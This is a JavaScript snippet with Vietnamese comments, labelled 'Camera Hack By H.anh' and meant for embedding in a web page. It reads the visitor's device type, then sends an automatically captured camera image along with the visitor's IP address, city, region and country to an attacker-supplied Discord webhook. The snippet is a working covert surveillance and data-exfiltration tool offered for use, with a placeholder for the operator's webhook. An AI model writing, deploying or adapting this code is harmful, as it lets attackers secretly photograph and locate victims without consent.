<script>
// ================== THAY ĐỔI Ở ĐÂY ==================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..................";   // ← Dán Webhook URL của bạn vào đây

// Lấy thông tin thiết bị
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = "Unknown";
    if (/iPhone/i.test(ua)) device = "iPhone";
    else if (/Android/i.test(ua)) device = "Android";
    else if (/Windows/i.test(ua)) device = "Windows";

    document.getElementById('device').textContent = device;
    document.getElementById('browser').textContent = ua.includes('Chrome') ? 'Chrome' : 'Safari/Firefox';
}

// ================== GỬI ẢNH + THÔNG TIN VỀ DISCORD ==================
async function sendToDiscord(canvas, ipInfo) {
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
    const formData = new FormData();
    
    const now = new Date();
    const timeStr = now.toLocaleString('vi-VN');

    const message = {
        username: "Camera Hack By H.anh",
        content: `📸 Ảnh chụp tự động\n` +
                 `⏰ ${timeStr}\n` +
                 `🌐 IP: ${ipInfo.ip || 'Không lấy được'}\n` +
                 `📍 ${ipInfo.city || ''}, ${ipInfo.region || ''} - ${ipInfo.country || 'VN'}\n` +
                 `📱 Thiết bị: ${document.getElementById('device').textContent}`
    };

    formData.append('payload_json', JSON.stringify(message));
    formData.append('file', blob, `Anh_chup_${now.getTime()}.jpg`);

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        console.log("Đã gửi ảnh + info về Discord thành công");
    } catch (e) {
        console.error("Gửi Discord thất bại:", e);
    }
}
